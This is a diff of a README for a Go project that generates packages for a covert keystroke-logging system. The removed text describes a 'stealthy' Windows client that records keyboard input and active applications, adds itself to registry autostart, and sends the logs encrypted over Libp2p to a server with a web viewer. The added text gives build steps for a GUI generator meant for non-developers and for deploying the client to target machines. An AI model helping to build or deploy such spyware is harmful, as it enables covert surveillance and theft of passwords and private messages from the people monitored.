@@ -1,111 +1,80 @@
-# GuiKeyStandaloneGo - P2P Activity Monitor Suite
 
-GuiKeyStandaloneGo is a project aimed at creating a standalone tool to generate packages for P2P-based activity monitoring. It consists of:
+## Building and Running the GUI Package Generator
 
-1.  **Generator:** A Go application (intended to be a standalone GUI/CLI executable) that produces deployment packages.
-2.  **Activity Monitor Client:** A stealthy Windows client that monitors user activity (foreground application, keyboard input) and sends encrypted data via Libp2p.
-3.  **Local Log Server:** A server application that receives encrypted data from clients via Libp2p, stores it, and provides a Web UI for viewing logs.
+### Prerequisites (for building the GUI Generator *itself*):
 
-## Current Project Status (As of the date these CGo removal changes were implemented)
+*   Go (e.g., version 1.21+).
+*   Fyne command-line tool: `go install fyne.io/fyne/v2/cmd/fyne@latest`
+*   (Windows) A C compiler like MinGW (e.g., via TDM-GCC or MSYS2) is recommended in your PATH for Fyne development and packaging, though often not strictly required for basic builds.
 
-The project has achieved a significant milestone: an end-to-end P2P data pipeline.
+### Steps to Build `gui_generator_app.exe`:
 
-*   **Generator:**
-    *   Functionally complete as a Command Line Interface (CLI).
-    *   Generates unique cryptographic keys (AES, Client UUIDs, Server Libp2p Identity).
-    *   Embeds all necessary configuration directly into the client and server binaries by generating `config_generated.go` files during its build process for the templates.
-    *   Cross-compiles client and server Go templates into Windows executables.
-    *   Packages executables with a `README_IMPORTANT_INSTRUCTIONS.txt`.
-    *   Uses a pure Go SQLite driver, removing CGo dependencies for client and server templates.
+1.  **Place Go SDK for Embedding:**
+    *   Download the **Go ZIP archive for Windows (amd64)** (e.g., `go1.22.0.windows-amd64.zip`) from [https://go.dev/dl/](https://go.dev/dl/).
+    *   Create the directory `GuiKeyStandaloneGo/gui_generator_app/embedded_go_sdk/`.
+    *   Place the downloaded Go ZIP file into this `embedded_go_sdk/` directory.
+    *   **CRITICAL:** Open `GuiKeyStandaloneGo/gui_generator_app/resources.go` and update the `embeddedGoSDKZipName` and `embeddedGoSDKSHA256` constants to match the exact filename and SHA256 checksum of the Go ZIP file you placed.
 
-*   **Client (Windows Executable):**
-    *   Starts with embedded configuration.
-    *   Monitors foreground application changes and keyboard input (raw key data).
-    *   Processes raw key data into human-readable strings.
-    *   Aggregates activity into structured `LogEvent` sessions.
-    *   Caches these `LogEvent`s locally in an SQLite database (`activity_cache.sqlite`) with retention policies and max size enforcement (using a pure Go SQLite driver).
-    *   Sets up Windows Registry entry for autostart.
-    *   Initializes a Libp2p host with Kademlia DHT, AutoNAT, Relay client, and Hole Punching capabilities.
-    *   Actively bootstraps into the DHT and attempts to discover the server.
-    *   A `SyncManager` encrypts and sends log batches to the server via a custom P2P protocol. It handles server acknowledgments and updates its local cache.
+2.  **Navigate to the `gui_generator_app` directory:**
+    ```bash
+    cd path/to/your/project/GuiKeyStandaloneGo/gui_generator_app
+    ```
 
-*   **Server (Windows Executable):**
-    *   Starts with embedded configuration.
-    *   Initializes a Libp2p host, listens on a configured P2P address.
-    *   Participates in the Kademlia DHT (including advertising itself with a rendezvous string) and uses AutoNAT.
-    *   Handles incoming P2P streams for the custom log protocol:
-        *   Decrypts the received payload.
-        *   Unmarshals `LogEvent`s.
-        *   Stores events in its own SQLite database (`activity_server.sqlite`) (using a pure Go SQLite driver).
-        *   Sends an acknowledgment response to the client.
-    *   Manages its local SQLite log store (pruning old logs).
-    *   **A functional (basic) Web UI is implemented** to display logs from its database with pagination, served via an embedded HTTP server.
+3.  **Ensure Dependencies are Tidy:**
+    ```bash
+    go mod tidy
+    ```
+    (Also run `go mod tidy` in the project root `GuiKeyStandaloneGo/` if you've made changes to `pkg/` or `generator/core/` dependencies.)
 
-*   **P2P Communication:**
-    *   Client and Server can successfully discover each other (primarily via DHT, potentially mDNS on LAN).
-    *   Encrypted data transfer from client to server is working.
-    *   Client correctly removes data from its cache upon successful sync acknowledgment from the server.
+4.  **Build the Executable:**
+    *   **Recommended (for distribution, includes icon and manifest):**
+        ```bash
+        fyne package -os windows
+        ```
+        This will create `YourAppName.exe` (e.g., "GuiKey Standalone Package Generator.exe" based on `FyneApp.toml`) in the current directory (`gui_generator_app/`).
+    *   **Simple Build (for testing):**
+        ```bash
+        go build -o GuiKeyGenerator.exe -ldflags="-H windowsgui"
+        ```
 
-## Project Structure
-```
-GuiKeyStandaloneGo/
-├── .gitignore
-├── go.mod
-├── go.sum
-├── generator/ # Go application to generate client/server packages
-│ ├── main.go
-│ └── core/
-│ └── generate.go
-│ └── templates/ # Go source code templates for client & server
-│ ├── client_template/ # Client monitor source
-│ │ ├── main.go
-│ │ ├── autorun_windows.go
-│ │ ├── foreground_windows.go
-│ │ ├── keyboard_windows.go
-│ │ ├── keyboard_processing.go
-│ │ ├── log_store_sqlite.go
-│ │ └── p2p_manager.go
-│ └── server_template/ # Log receiver server source
-│ ├── main.go
-│ ├── log_store_sqlite.go
-│ ├── p2p_manager.go
-│ ├── web_ui_handlers.go
-│ ├── static/ # CSS/JS for Web UI
-│ │ └── style.css
-│ └── web_templates/ # HTML templates for Web UI
-│ ├── logs_view.html
-│ └── error_page.html
-├── pkg/ # Shared Go packages
-│ ├── config/
-│ │ └── models.go
-│ ├── crypto/
-│ │ ├── aes.go
-│ │ └── keys.go
-│ ├── p2p/
-│ │ └── protocol.go
-│ └── types/
-│ └── events.go
-└── README.md
-```
+### Running the GUI Package Generator (`GuiKeyGenerator.exe`):
 
-## Building and Running
+1.  Locate the generated `GuiKeyGenerator.exe`.
+2.  Double-click to run it. No prior Go installation is needed on the user's machine.
+3.  **First Run:** The application will take some time during "Step 1: Preparing Environment" as it extracts the embedded Go compiler and source templates to temporary locations. This happens once per application session.
+4.  Follow the on-screen steps:
+    *   **Step 1:** Wait for environment preparation to complete.
+    *   **Step 2:** Configure the output directory and (optionally) bootstrap peer addresses.
+    *   **Step 3:** Click "Generate Packages" and wait for the client and server binaries to be compiled.
+    *   **Step 4:** View the generated instructions. The packages will be in your chosen output directory.
+5.  The application will attempt to clean up temporary files on exit. Check the application logs for details (path usually mentioned in console output on start or found in user's config directory).
 
-### Prerequisites
+## Using the Generated Client and Server Packages
 
-*   Go (version 1.18+ recommended for generics, though current code might work with slightly older).
-*   (CGo is no longer required as of the date these changes were implemented)
+After the GUI Generator creates the packages:
 
-### Running the Generator
+1.  Follow the instructions in the `README_IMPORTANT_INSTRUCTIONS.txt` file located in your chosen output directory.
+2.  Typically, this involves:
+    *   Deploying the `LocalLogServer_Package` contents to your server machine and running `local_log_server.exe`.
+    *   Deploying the `ActivityMonitorClient_Package` contents to target Windows machines and running `activity_monitor_client.exe`.
 
-1.  Navigate to the project root (`GuiKeyStandaloneGo/`).
-2.  Ensure dependencies are present: `go mod tidy`
-3.  Navigate to the generator directory: `cd generator`
-4.  Run the generator: `go run main.go -output ../_generated_packages`
-    *   The `-output` flag specifies where the `ActivityMonitorClient_Package` and `LocalLogServer_Package` will be created.
-    *   Other flags (e.g., for `-bootstrap` addresses) can be added.
+## Key Design Choices & Features
 
-### Deploying and Running Client/Server
+*   **Standalone Generator:** The primary goal of making the generator usable by non-developers without needing a Go environment is achieved by embedding the compiler and templates.
+*   **Pure Go Client/Server:** Utilizes `modernc.org/sqlite`, removing CGo dependencies from the generated client and server, simplifying their compilation by the embedded Go.
+*   **Multi-Step GUI:** The Fyne application provides a clear, step-by-step process for package generation.
+*   **Robust Error Handling & Logging:** The GUI application includes logging to a file to help diagnose issues during resource preparation or package generation.
+*   **Temporary File Management:** Embedded resources are extracted to temporary locations and cleaned up on application exit.
 
-Follow the instructions in the `README_IMPORTANT_INSTRUCTIONS.txt` file generated within your output package directory. Typically:
-1.  Deploy the contents of `LocalLogServer_Package` to your server machine and run `local_log_server.exe`. Note its PeerID and listening addresses from its logs.
-2.  Deploy the contents of `ActivityMonitorClient_Package` to the target Windows machine(s) and run `activity_monitor_client.exe`.
+## Future Work & Potential Enhancements
+
+*   **GUI Generator:**
+    *   More granular control over client/server configuration options in the GUI.
+    *   Ability to save/load generation profiles.
+    *   Cross-compilation options (if embedding Go toolchains for other OS/Arch becomes feasible and desired).
+    *   "Open Output Folder" button with native OS integration.
+*   **Client/Server:**
+    *   Enhanced logging (structured, leveled logging like Zerolog/Zap).
+    *   More advanced Web UI features for the server (filtering, searching, user accounts).
+    *   Further hardening of P2P connectivity and security.
+    *   Comprehensive automated testing suite.
